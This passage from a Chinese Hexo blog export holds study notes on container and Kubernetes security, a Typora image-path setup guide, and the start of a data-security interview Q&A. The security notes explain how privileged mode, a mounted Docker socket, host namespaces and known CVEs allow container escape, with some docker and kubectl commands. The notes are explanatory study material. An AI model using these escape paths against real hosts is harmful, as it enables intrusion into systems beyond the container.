id="KVM劣势"><a href="#KVM劣势" class="headerlink" title="KVM劣势"></a>KVM劣势</h4><h3 id="qemu-kvm-1"><a href="#qemu-kvm-1" class="headerlink" title="qemu-kvm"></a>qemu-kvm</h3><h4 id="qemu-kvm原理"><a href="#qemu-kvm原理" class="headerlink" title="qemu-kvm原理"></a>qemu-kvm原理</h4><p>由于 qemu 和 kvm 单独使用都会存在一些不满意的地方，所以 qemu 将 kvm 整合，使用 ioctl 调用 &#x2F;dev&#x2F;kvm 接口，将相关 CPU 的指令直接交由 内核进行处理。</p><p>kvm 模拟 CPU 和内存，实现CPU和内存的虚拟化；qemu 模拟 IO 设备，实现 IO 的虚拟化。通过两者实现服务器的虚拟化，所以就是 qemu-kvm。</p><h2 id="容器技术"><a href="#容器技术" class="headerlink" title="容器技术"></a>容器技术</h2><h3 id="容器和虚拟化"><a href="#容器和虚拟化" class="headerlink" title="容器和虚拟化"></a>容器和虚拟化</h3><p><strong>虚拟化：Vritualization</strong></p><p>通常在hypervisor层实现对硬件资源的虚拟化，hypervisor为虚拟机提供了虚拟的运行平台，管理虚拟机的操作系统的运行，每个虚拟机都有自己的操作系统、系统库和应用</p><p><strong>容器：Container</strong></p><p>没有hypervisor层，每个容器是与主机共享硬件资源及操作系统</p><p>在操作系统层面实现了对计算机系统资源的虚拟化，在操作系统中对CPU、内存和文件系统等资源的隔离划分和控制，实现进程之间透明的资源使用。</p><h3 id="容器镜像"><a href="#容器镜像" class="headerlink" title="容器镜像"></a>容器镜像</h3><p>镜像是容器运行的基础，容器引擎可使用不同的镜像启动相应的容器</p><p>虚拟机镜像是将完整的操作系统封装成一个镜像文件</p><p>容器镜像不是一个文件，是分层存储的文件系统，所以如果对镜像内某个文件修改时，只是修改的最上方的读写层，不会覆盖下层已有的文件系统</p><h3 id="容器存储"><a href="#容器存储" class="headerlink" title="容器存储"></a>容器存储</h3><h4 id="镜像元数据"><a href="#镜像元数据" class="headerlink" title="镜像元数据"></a>镜像元数据</h4><p>Linux系统中docker的数据默认存储在&#x2F;var&#x2F;lib&#x2F;docker中</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs tap">└─<span class="hljs-comment"># ls -l /var/lib/docker</span><br>总用量 44<br>drwx--x--x <span class="hljs-number"> 4 </span>root root<span class="hljs-number"> 4096 </span> 4月<span class="hljs-number"> 22 </span>19:08 buildkit<br>drwx--x--- <span class="hljs-number"> 3 </span>root root<span class="hljs-number"> 4096 </span> 7月 <span class="hljs-number"> 5 </span>09:00 containers<br>drwx------ <span class="hljs-number"> 3 </span>root root<span class="hljs-number"> 4096 </span> 4月<span class="hljs-number"> 22 </span>19:08 image<br>drwxr-x--- <span class="hljs-number"> 3 </span>root root<span class="hljs-number"> 4096 </span> 4月<span class="hljs-number"> 22 </span>19:08 network<br>drwx--x---<span class="hljs-number"> 26 </span>root root<span class="hljs-number"> 4096 </span> 7月 <span class="hljs-number"> 5 </span>09:00 overlay2<br>drwx------ <span class="hljs-number"> 4 </span>root root<span class="hljs-number"> 4096 </span> 4月<span class="hljs-number"> 22 </span>19:08 plugins<br>drwx------ <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span> 7月 <span class="hljs-number"> 3 </span>11:05 runtimes<br>drwx------ <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span> 4月<span class="hljs-number"> 22 </span>19:08 swarm<br>drwx------ <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span> 7月 <span class="hljs-number"> 4 </span>09:33 tmp<br>drwx------ <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span> 4月<span class="hljs-number"> 22 </span>19:08 trust<br>drwx-----x<span class="hljs-number"> 17 </span>root root<span class="hljs-number"> 4096 </span> 7月 <span class="hljs-number"> 5 </span>09:00 volumes<br><br></code></pre></td></tr></table></figure><p>基于不同的系统又有不同的存储驱动和不同的目录结构</p><p>镜像每一层的ID是该文件内容的散列校验值，作为该层的唯一标识。</p><p>镜像索引方式：</p><p>读取镜像的manifests文件</p><p>获取config的sha256码</p><p>得到镜像config文件</p><p>遍历manifests文件中的所有层（layer）</p><p>根据sha256码在本地查找</p><p>拼出完整镜像</p><h4 id="存储驱动"><a href="#存储驱动" class="headerlink" title="存储驱动"></a>存储驱动</h4><p>Docker 依靠驱动技术管理镜像和运行它们的容器间的存储和交互</p><p>当前支持的存储驱动</p><p>overlay2、aufs、fuse-overlays、devicemapper、btrfs、zfs、vfs</p><h4 id="数据卷"><a href="#数据卷" class="headerlink" title="数据卷"></a>数据卷</h4><p>docker采用数据卷（Volume）的形式向容器提供持久化存储</p><h3 id="容器网络"><a href="#容器网络" class="headerlink" title="容器网络"></a>容器网络</h3><p>容器网络目前可分为主机网络和集群网络</p><p>主机网络</p><p>以Docker为例，分为 None 网络模式、Bridge 网络模式、Host 网络模式和 Container 网络模式</p><p>集群网络以 Kubernetes 为例</p><p>Pod 为 Kubernetes 应用运行的基本单元，每个 Pod 中包含一个或多个相关的容器，多个容器运行在同一主机中，并且共享相同的网络命名空间和相同的Linux协议栈</p><p>集群网络基于Pod主要涉及以下三种通信</p><p>同一Pod内，容器和容器之间的通信</p><p>同一主机内不同Pod之间的通信</p><p>跨主机Pod之间的通信</p><h3 id="容器运行时"><a href="#容器运行时" class="headerlink" title="容器运行时"></a>容器运行时</h3><p>容器运行时负责管理容器运行的整个生命周期，包括但不限于指定容器镜像格式、构建镜像、上传和拉取镜像、管理镜像、管理容器实例、运行容器等</p><p>OCI（Open Container Initiative）开放容器标准</p><p>包含容器运行时标准和容器镜像标准</p><p>容器运行时标准主要包含 runC、Rocket、Kata Containers、gVisor等</p><p>CRI（Container Runtime Interface）容器运行时接口</p><p>当前支持的CRI运行时包括 Docker、Containerd、CRI-O</p><h2 id="容器编排"><a href="#容器编排" class="headerlink" title="容器编排"></a>容器编排</h2><p>关注度较高的容器编排平台</p><p>Kubernetes </p><p>apache mesos</p><p>docker Swarm</p><p>OpenShift</p><p>Rancher</p><h2 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h2><p>服务之间通常通过 RESTful 通信</p><h2 id="服务网格"><a href="#服务网格" class="headerlink" title="服务网格"></a>服务网格</h2><p>Service Mesh</p><p>通常通过一组轻量级网络代理实现，这些代理与应用程序一起部署，而无须感知应用程序本身</p><p>Sidecar 运行在服务旁，并对服务透明。由于所有通过服务的流量均会经过Sidecar，因此Sidecar可实现流量控制功能，如服务发现、负载均衡、智能路由、故障注入、熔断器、TLS终止等</p><p>Istio为代表</p><h2 id="Serverless"><a href="#Serverless" class="headerlink" title="Serverless"></a>Serverless</h2><p>Serverless可在不考虑服务器的情况下构建并运行应用程序和服务，也就是开放者只负责开发，服务器均交给第三方管理</p><p>两种实现方式</p><p>BaaS（Backend as a Service，后端即服务）</p><p>FaaS（Functions as a Service，函数即服务），主要实现方式</p><p>典型代表</p><p>AWS Lamba</p><p>阿里云的函数计算</p><p>Kubernetes的kubeless</p><p>Apache OpenWhisk</p><h1 id="云原生安全架构"><a href="#云原生安全架构" class="headerlink" title="云原生安全架构"></a>云原生安全架构</h1><h2 id="容器安全"><a href="#容器安全" class="headerlink" title="容器安全"></a>容器安全</h2><p>关键字：容器逃逸</p><h3 id="容器基础设施安全"><a href="#容器基础设施安全" class="headerlink" title="容器基础设施安全"></a>容器基础设施安全</h3><p>主机安全配置是否会影响到容器</p><p>主机恶意进程和安全漏洞是否会影响到容器</p><p>容器内进程是否可以利用主机上的安全漏洞</p><h3 id="容器镜像安全"><a href="#容器镜像安全" class="headerlink" title="容器镜像安全"></a>容器镜像安全</h3><p>镜像中的软件是否存在安全漏洞</p><p>镜像构建过程中是否存在安全风险</p><p>镜像传输过程中是否被恶意篡改</p><h3 id="容器运行安全"><a href="#容器运行安全" class="headerlink" title="容器运行安全"></a>容器运行安全</h3><p>运行的容器间的隔离是否充分</p><p>容器间的通信是否安全</p><p>容器内的恶意程序是否会影响到主机或者其他容器</p><p>容器的资源使用情况是否安全</p><h3 id="容器编排安全"><a href="#容器编排安全" class="headerlink" title="容器编排安全"></a>容器编排安全</h3><p>Docker自身的安全性</p><p>service mesh&#x2F;serverless对容器安全的影响</p><p>容器中安全密钥的管理和传统环境的不同</p><p>容器化的数据隐私保护与传统的数据隐私保护是否一致</p><h3 id="容器应用安全"><a href="#容器应用安全" class="headerlink" title="容器应用安全"></a>容器应用安全</h3><h2 id="安全能力架构"><a href="#安全能力架构" class="headerlink" title="安全能力架构"></a>安全能力架构</h2><h3 id="物理安全"><a href="#物理安全" class="headerlink" title="物理安全"></a>物理安全</h3><h3 id="系统安全"><a href="#系统安全" class="headerlink" title="系统安全"></a>系统安全</h3><p>系统完整性保护</p><p>OS&#x2F;DB&#x2F;WEB加固</p><p>安全补丁</p><p>病毒防护</p><h3 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h3><p>防火墙</p><p>IDS&#x2F;IPS</p><p>Anti-DDOS</p><p>僵尸网络&#x2F;蠕虫检测</p><p>网络平面隔离</p><p>传输安全（SSL&#x2F;VPN)</p><h3 id="管理安全"><a href="#管理安全" class="headerlink" title="管理安全"></a>管理安全</h3><p>多因素接入认证</p><p>集中用户管理和认证</p><p>集中日志审计</p><p>镜像签名和完整性保护</p><h3 id="虚拟化安全"><a href="#虚拟化安全" class="headerlink" title="虚拟化安全"></a>虚拟化安全</h3><p>虚拟机隔离</p><p>虚拟防火墙</p><p>恶意VM预防</p><h3 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h3><p>数据隔离</p><p>数据访问控制</p><p>剩余信息保护</p><p>快照加密</p><p>用户数据加密存储</p><p>存储位置要求</p><h1 id="元原生安全风险"><a href="#元原生安全风险" class="headerlink" title="元原生安全风险"></a>元原生安全风险</h1><h2 id="容器基础设施的风险分析"><a href="#容器基础设施的风险分析" class="headerlink" title="容器基础设施的风险分析"></a>容器基础设施的风险分析</h2><h3 id="1、容器基础设施面临的风险"><a href="#1、容器基础设施面临的风险" class="headerlink" title="1、容器基础设施面临的风险"></a>1、容器基础设施面临的风险</h3><h4 id="1-1、容器镜像存在的风险"><a href="#1-1、容器镜像存在的风险" class="headerlink" title="1.1、容器镜像存在的风险"></a>1.1、容器镜像存在的风险</h4><h5 id="1-1-1、不安全的第三方组件"><a href="#1-1-1、不安全的第三方组件" class="headerlink" title="1.1.1、不安全的第三方组件"></a>1.1.1、不安全的第三方组件</h5><p>基于原生镜像的基础上进行二次开发，导致原有镜像中存在非必须的组件，且这些组件存在风险。</p><h5 id="1-1-2、恶意镜像"><a href="#1-1-2、恶意镜像" class="headerlink" title="1.1.2、恶意镜像"></a>1.1.2、恶意镜像</h5><p>公共镜像存在引入恶意镜像的风险</p><h5 id="1-1-3、敏感信息泄露"><a href="#1-1-3、敏感信息泄露" class="headerlink" title="1.1.3、敏感信息泄露"></a>1.1.3、敏感信息泄露</h5><p>为开发调试的便捷性，存在将敏感信息写入代码或配置文件，构成镜像时，敏感信息一并打包到，传输的外部镜像仓库，导致信息泄露。</p><h4 id="1-2、活动容器存在的风险"><a href="#1-2、活动容器存在的风险" class="headerlink" title="1.2、活动容器存在的风险"></a>1.2、活动容器存在的风险</h4><h5 id="1-2-1、不安全的容器应用"><a href="#1-2-1、不安全的容器应用" class="headerlink" title="1.2.1、不安全的容器应用"></a>1.2.1、不安全的容器应用</h5><p>如果启动时配置了端口映射，容器应用外部可访问，传统业务代码的安全风险依然存在。</p><h5 id="1-2-2、不受限制的资源共享"><a href="#1-2-2、不受限制的资源共享" class="headerlink" title="1.2.2、不受限制的资源共享"></a>1.2.2、不受限制的资源共享</h5><p>默认情况下，Docker不会对容器的资源使用进行限制，也就是容器可以无限制使用宿主机资源。存在容器耗尽宿主机资源的风险。</p><h5 id="1-2-3、不安全的配置与挂载"><a href="#1-2-3、不安全的配置与挂载" class="headerlink" title="1.2.3、不安全的配置与挂载"></a>1.2.3、不安全的配置与挂载</h5><p>配置与挂载：容器在启动时带有的配置选项和挂载选项</p><p><strong>容器核心隔离机制</strong>：</p><ul><li>Linux命名空间机制：在文件系统、网络、进程、进程间通信和主机名等方面实现隔离。</li><li>cgroups机制：在CPU、内存和硬盘等资源方面实现隔离。</li><li>Capabilities、Seccomp和AppArmor等机制：限制容器内进程间的权限和系统调用访问能力</li></ul><p><strong>打破隔离方式</strong>：</p><ul><li>配置 –privileged 选项，容器将不受 Seccomp等安全机制的限制，容器内root权限将变得和宿主机上的root一样</li><li>配置 –net&#x3D;host，容器将与宿主机处于同一网络命令空间（打破网络隔离）</li><li>配置 –pid&#x3D;host，容器将与宿主机处于同一进程命令空间（打破进程隔离）</li><li>执行挂载 –volume &#x2F;:&#x2F;host，宿主机根目录将被挂载到容器内部（打破文件系统隔离）</li></ul><p>1.3、容器网络存在的风险</p><h3 id="3-4、运行时容器的攻击案例"><a href="#3-4、运行时容器的攻击案例" class="headerlink" title="3.4、运行时容器的攻击案例"></a>3.4、运行时容器的攻击案例</h3><h4 id="攻击分类"><a href="#攻击分类" class="headerlink" title="攻击分类"></a>攻击分类</h4><p>1）主要影响机密性、完整性的：通常是获取目标系统控制权、窃取或修改数据等。</p><p>2）主要影响可用性的：通常是对目标系统信息资源的耗尽型攻击。</p><h4 id="3-4-1、容器逃逸"><a href="#3-4-1、容器逃逸" class="headerlink" title="3.4.1、容器逃逸"></a>3.4.1、容器逃逸</h4><h5 id="3-4-1-1、不安全配置导致的容器逃逸"><a href="#3-4-1-1、不安全配置导致的容器逃逸" class="headerlink" title="3.4.1.1、不安全配置导致的容器逃逸"></a>3.4.1.1、不安全配置导致的容器逃逸</h5><p>docker 已经将容器运行时的Capabilities黑名单机制改为如今的默认禁止所有Capabilities，再以白名单方式赋予容器运行所需的最小权限。</p><p>Docker默认赋予容器近40项权限中的14项</p><p>CAP_CHOWN</p><p>CAP_DAC_OVERRIDE</p><p>CAP_FSETID</p><p>CAP_FOWNER<br>CAP_MKNOD<br>CAP_NET_RAW<br>CAP_SETGID<br>CAP_SETUID<br>CAP_SETFCAP</p><p>CAP_SETPCAP</p><p>CAP_NET_BIND_SERVICE</p><p>CAP_SYS_CHROOT<br>CAP_KILL<br>CAP_AUDIT_WAITE</p><p><strong>–privileged  特权模式运行容器</strong></p><p>特权容器允许访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有于那些直接运行在宿主机上的进程几乎相同的权限</p><p>创建非特权容器</p><p>docker run -itd –name non_privileged_centos centos &#x2F;bin&#x2F;bash</p><p>root@VM-8-5-ubuntu:~# docker run -itd –name non_privileged_centos centos &#x2F;bin&#x2F;bash<br>f2fa3a889b7d43d5bc371bf02d62b360ffa9cce7737eb6a4cfae60864be5625e</p><p>创建特权容器</p><p>docker run -t -i -d –privileged  –name privileged_centos centos &#x2F;bin&#x2F;bash</p><p>root@VM-8-5-ubuntu:~# docker run -t -i -d –privileged  –name privileged_centos centos &#x2F;bin&#x2F;bash<br>7ef25d5d2b4605bef917323d591f9596b95c6262268fda77edac4f13322de2f5</p><p>root@VM-8-5-ubuntu:~# docker run -itd –name privileged busybox –privileged<br>e5b459ca0fe56484dee600d919f1fafde42631923fa326393d60c1692fea1d27<br>docker: Error response from daemon: failed to create shim: OCI runtime create failed: container_linux.go:380: starting container process caused: exec: “–privileged”: executable file not found in $PATH: unknown.</p><p>docker exec id fdisk -l</p><p>docker exec id fdisk -l | tail -n 2</p><p>ps </p><p>procfs</p><h5 id="3-4-1-2-不安全挂载导致的容器逃逸"><a href="#3-4-1-2-不安全挂载导致的容器逃逸" class="headerlink" title="3.4.1.2 不安全挂载导致的容器逃逸"></a>3.4.1.2 不安全挂载导致的容器逃逸</h5><p>将宿主机敏感文件或敏感目录挂在到不可控的容器中，会存在安全问题</p><h6 id="将-Docker-Socket-挂载到容器内"><a href="#将-Docker-Socket-挂载到容器内" class="headerlink" title="将 Docker Socket 挂载到容器内"></a>将 Docker Socket 挂载到容器内</h6><p>Docker Socket 是 Docker  守护进程监听的UNIX套接字，用来与守护进程通信-查询信息或下发命令，如果将该套接字文件&#x2F;var&#x2F;run&#x2F;docker.sock挂载到攻击者可控容器，存在被逃逸的风险</p><h6 id="挂载宿主机-profs"><a href="#挂载宿主机-profs" class="headerlink" title="挂载宿主机 profs"></a>挂载宿主机 profs</h6><h5 id="3-4-1-3-相关程序漏洞导致的容器逃逸"><a href="#3-4-1-3-相关程序漏洞导致的容器逃逸" class="headerlink" title="3.4.1.3 相关程序漏洞导致的容器逃逸"></a>3.4.1.3 相关程序漏洞导致的容器逃逸</h5><p>CVE-2019-5736 覆盖宿主机上的runC文件</p><h5 id="3-4-1-4-内核漏洞导致的容器逃逸"><a href="#3-4-1-4-内核漏洞导致的容器逃逸" class="headerlink" title="3.4.1.4 内核漏洞导致的容器逃逸"></a>3.4.1.4 内核漏洞导致的容器逃逸</h5><p>CVE-2016-5195 内存页的写时复制问题</p><h4 id="3-4-2-安全容器逃逸"><a href="#3-4-2-安全容器逃逸" class="headerlink" title="3.4.2 安全容器逃逸"></a>3.4.2 安全容器逃逸</h4><h4 id="3-4-3-资源耗尽型攻击"><a href="#3-4-3-资源耗尽型攻击" class="headerlink" title="3.4.3 资源耗尽型攻击"></a>3.4.3 资源耗尽型攻击</h4><p>容器运行时默认情况下未对容器内进程在资源使用上做任何限制，以Pod为基本单位的容器编排管理系统在默认情况下也未对用户创建的Pod做任何CPU、内容使用限制</p><h5 id="3-4-3-1-CPU资源耗尽攻击"><a href="#3-4-3-1-CPU资源耗尽攻击" class="headerlink" title="3.4.3.1 CPU资源耗尽攻击"></a>3.4.3.1 CPU资源耗尽攻击</h5><h2 id="容器编排平台的风险分析"><a href="#容器编排平台的风险分析" class="headerlink" title="容器编排平台的风险分析"></a>容器编排平台的风险分析</h2><h3 id="容器编排平台面临的风险"><a href="#容器编排平台面临的风险" class="headerlink" title="容器编排平台面临的风险"></a>容器编排平台面临的风险</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>CNI插件Flannel：Pod之间通信的工具</p><p>kube-system命名空间</p><p>Flannel Pod</p><p>kube-proxy Pod</p><p>Kubernetes集群中需要以YAML声明式文件的形式来创建Pod，Pod为逻辑概念，实际由一个或多个容器组成。</p><p>对容器的配置须以Pod的配置方式下发。</p><h4 id="4-1-1-容器基础设施存在的风险"><a href="#4-1-1-容器基础设施存在的风险" class="headerlink" title="4.1.1 容器基础设施存在的风险"></a>4.1.1 容器基础设施存在的风险</h4><p>kubernetes提供了ConfigMaps和Secrets两种资源来单独存储常规配置和敏感信息</p><h4 id="4-1-2-Kubernetes-组件接口存在的风险"><a href="#4-1-2-Kubernetes-组件接口存在的风险" class="headerlink" title="4.1.2 Kubernetes 组件接口存在的风险"></a>4.1.2 Kubernetes 组件接口存在的风险</h4><p>Kubernetes中绝大多数组件以基于HTTP或HTTPS的API形式提供服务</p><p>常见服务及端口信息</p><table><thead><tr><th>组件</th><th>默认端口</th><th>说明</th></tr></thead><tbody><tr><td>API Server</td><td>6443</td><td>基于HTTPS的安全端口</td></tr><tr><td>API Server</td><td>8080</td><td>不安全的HTTP端口，不建议启用</td></tr><tr><td>Kubelet</td><td>10248</td><td>用于检查kubelet健康状态的HTTP端口</td></tr><tr><td>Kubelet</td><td>10250</td><td>面向API Server提供服务的HTTPS端口</td></tr><tr><td>Dashboard</td><td>8001</td><td>提供HTTP服务的端口</td></tr><tr><td>etcd</td><td>2379</td><td>客户端与服务端之间通信的接口</td></tr><tr><td>etcd</td><td>2380</td><td>不同服务端实例之间通信的端口</td></tr></tbody></table><p>1、API Server</p><p>默认情况下，API Server在8080和6443两个端口提供服务</p><p>8080端口提供没有TLS加密的HTTP服务，所有到达端口的请求将绕过所有认证和授权模块（但是任然会被准入控制模块处理？？？）</p><p>6443端口提供TLS加密的HTTPS服务，到达的请求必须通过认证和授权机制才能被成功处理</p><p>2、Dashboard</p><p>按照官方文档部署的K8s需要经过 kubectl proxy 才可以通过本地8001端口访问dashboard，但是如果直接将dashboard映射到宿主机节点或者在执行 kubectl proxy是使用额外的参数（kubectl proxy –address 0.0.0.0 –accept-hosts&#x3D;’^*$’），会出现只要可以访问到宿主机的都可以访问到dashboard</p><p>默认情况下，dashboard是需要登录认证，但是如果在dashboard启动参数中添加 –enable-skip-login选项，则就可以通过点击dashboard界面的“跳过”来绕过认证</p><p>3、Kubelet</p><h2 id="云原生应用的风险分析"><a href="#云原生应用的风险分析" class="headerlink" title="云原生应用的风险分析"></a>云原生应用的风险分析</h2><p>5.3 云原生应用的新风险分析</p><p>5.3.1 数据泄露风险</p><p>1）应用漏洞</p><p>API造成的数据泄露风险</p><p>2）密钥不规范管理</p><p>硬编码</p><p>解决方案：</p><p>代码与配置可分离</p><p>配置支持分布式</p><p>配置实时可更新</p><p>配置可统一治理</p><p>3）应用间通信未加密</p><p>gRPC协议，默认不加密</p><p>5.3.2 未授权访问的风险</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>cloudsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>base</tag>
      
      <tag>cloudsec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo_images</title>
    <link href="/2024/12/16/yunwei/hexo/hexo_images/"/>
    <url>/2024/12/16/yunwei/hexo/hexo_images/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="hexo-typora"><a href="#hexo-typora" class="headerlink" title="hexo+typora"></a>hexo+typora</h2><h3 id="设置typora"><a href="#设置typora" class="headerlink" title="设置typora"></a>设置typora</h3><p>在设置-&gt;图像设置</p><p><img src="/2024/12/16/yunwei/hexo/hexo_images/image-20221230182231829.png" alt="image-20221230182231829"></p><h3 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h3><p>_config.yml中配置，会在使用 hexo new post_name 创建新文档时，在当前目录创建和文档名相同的文件夹，用于存储对应文档的图像</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">post_asset_folder:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>按照上述设置后，typora可以限制图像，但是hexo无法显示图像</p><h3 id="安装插件hexo-renderer-marked"><a href="#安装插件hexo-renderer-marked" class="headerlink" title="安装插件hexo-renderer-marked"></a>安装插件hexo-renderer-marked</h3><p>新版本hexo已集成hexo-renderer-marked，如果不确定，可以使用npm查询</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">➜  tthourshexo npm list hexo-<span class="hljs-keyword">renderer</span>-marked<br>hexo-site@0<span class="hljs-number">.0</span><span class="hljs-number">.0</span> /Users/admin/tthours/tthourshexo<br>└── hexo-<span class="hljs-keyword">renderer</span>-marked@6<span class="hljs-number">.3</span><span class="hljs-number">.0</span><br></code></pre></td></tr></table></figure><h3 id="修改-config-yml配置"><a href="#修改-config-yml配置" class="headerlink" title="修改_config.yml配置"></a>修改_config.yml配置</h3><p>增加如下内容</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">marked:</span><br>  <span class="hljs-params">prependRoot:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">postAsset:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><img src="/2024/12/16/yunwei/hexo/hexo_images/image-20241216185909849.png" alt="image-20241216185909849"></p><p><img src="/2024/12/16/yunwei/hexo/hexo_images/image-20241216185919525.png" alt="image-20241216185919525"></p><p><img src="/2024/12/16/yunwei/hexo/hexo_images/image-20241216185930812.png" alt="image-20241216185930812"></p><h3 id="安装插件hexo-asset-image-不好用"><a href="#安装插件hexo-asset-image-不好用" class="headerlink" title="安装插件hexo-asset-image(不好用)"></a>安装插件hexo-asset-image(不好用)</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">npm install hexo-asset-<span class="hljs-selector-tag">image</span> <span class="hljs-attr">--save</span><br></code></pre></td></tr></table></figure><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">➜  tthourshexo npm install hexo-asset-image --save<br><br>added <span class="hljs-number">21</span> packages, <span class="hljs-literal">and</span> audited <span class="hljs-number">254</span> packages in <span class="hljs-number">5</span>s<br><br><span class="hljs-number">30</span> packages are looking for funding<br>  run `npm fund` for details<br><br><span class="hljs-number">6</span> vulnerabilities (<span class="hljs-number">1</span> moderate, <span class="hljs-number">4</span> high, <span class="hljs-number">1</span> <span class="hljs-keyword">critical</span>)<br><br>Some issues need review, <span class="hljs-literal">and</span> may require choosing<br>a different dependency.<br><br>Run `npm audit` for details.<br></code></pre></td></tr></table></figure><p>插件的作用在于<code>hexo generate</code>生成静态网页资源时自动由相对路径生成绝对路径，但要求md文件中必须使用相对路径，此时的md中复制的图片目录为<code>/同名文件夹/图片名</code>，多了个文件夹路径</p><h4 id="图片文件根目录设置"><a href="#图片文件根目录设置" class="headerlink" title="图片文件根目录设置"></a>图片文件根目录设置</h4><p>打开<code>/blog/scaffolds/post.md</code>，该文件为每次hexo新建md文件时的格式，包括title、date等属性，在该属性中加入<code>typora-root-url: &#123;&#123; title &#125;&#125;</code>，使hexo新建的md文件自动以同路径下的同名文件夹为图片根目录。</p><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><p>【1】Typora与Hexo的图片根目录设置 Magnesium 2022年12月30日</p><p><a href="https://cmmyyyy.github.io/2022/12/30/Typora%E4%B8%8EHexo%E7%9A%84%E5%9B%BE%E7%89%87%E6%A0%B9%E7%9B%AE%E5%BD%95%E8%AE%BE%E7%BD%AE/">https://cmmyyyy.github.io/2022/12/30/Typora%E4%B8%8EHexo%E7%9A%84%E5%9B%BE%E7%89%87%E6%A0%B9%E7%9B%AE%E5%BD%95%E8%AE%BE%E7%BD%AE/</a></p><p>【2】Hexo插入图片（好用的办法）robotx 2023-11-29</p><p><a href="https://juejin.cn/post/7306723921717198899">https://juejin.cn/post/7306723921717198899</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>datasec_数据安全面试</title>
    <link href="/2024/12/16/security/datasec/datasec_%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    <url>/2024/12/16/security/datasec/datasec_%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="专业知识与技能"><a href="#专业知识与技能" class="headerlink" title="专业知识与技能"></a>专业知识与技能</h2><h3 id="数据加密技术"><a href="#数据加密技术" class="headerlink" title="数据加密技术"></a>数据加密技术</h3><h4 id="对称加密与非对称加密"><a href="#对称加密与非对称加密" class="headerlink" title="对称加密与非对称加密"></a>对称加密与非对称加密</h4><p>Q:</p><p>询问候选人对对称加密（如 AES）和非对称加密（如 RSA）的理解。例如，“请解释一下对称加密和非对称加密的主要区别，以及它们各自的适用场景。”</p><p>A:</p><ul><li><p><strong>对称加密</strong></p><ul><li>定义与原理<ul><li>对称加密是一种加密方式，它使用相同的密钥进行加密和解密操作。也就是说，发送方和接收方必须事先共享一个密钥。例如，在使用 AES（高级加密标准）算法时，发送方使用密钥将明文加密成密文，接收方使用相同的密钥将密文还原为明文。这个密钥就像是一把特殊的 “锁” 和 “钥匙”，加密是 “锁” 上信息，解密是 “打开” 信息。</li></ul></li><li>主要特点<ul><li><strong>加密速度快</strong>：因为只需要使用一个密钥进行简单的数学运算，所以对称加密在处理大量数据时速度优势明显。例如，在对大型文件或者实时通信的数据流进行加密时，对称加密能够快速地完成加密操作，不会因为加密过程导致明显的延迟。</li><li><strong>密钥管理复杂</strong>：由于发送方和接收方需要共享相同的密钥，这就带来了密钥管理的难题。在多人通信或者分布式系统中，如何安全地分发密钥是一个关键问题。如果密钥在传输过程中被窃取，整个加密系统就会崩溃。</li></ul></li><li>适用场景<ul><li><strong>大量数据加密</strong>：对于需要加密大量数据的场景，如企业内部的数据存储加密、云存储中的用户数据加密等，对称加密是很好的选择。因为它的加密速度能够满足高效处理大量数据的需求。</li><li><strong>实时通信加密</strong>：在实时通信场景下，如语音通话、视频会议等加密，对称加密可以快速地对实时产生的数据流进行加密，保证通信内容的隐私性。</li></ul></li></ul></li><li><p><strong>非对称加密</strong></p><ul><li>定义与原理<ul><li>非对称加密使用一对密钥，即公钥和私钥。公钥可以公开，任何人都可以使用公钥对信息进行加密，但只有拥有私钥的人才能对加密后的信息进行解密。例如，在 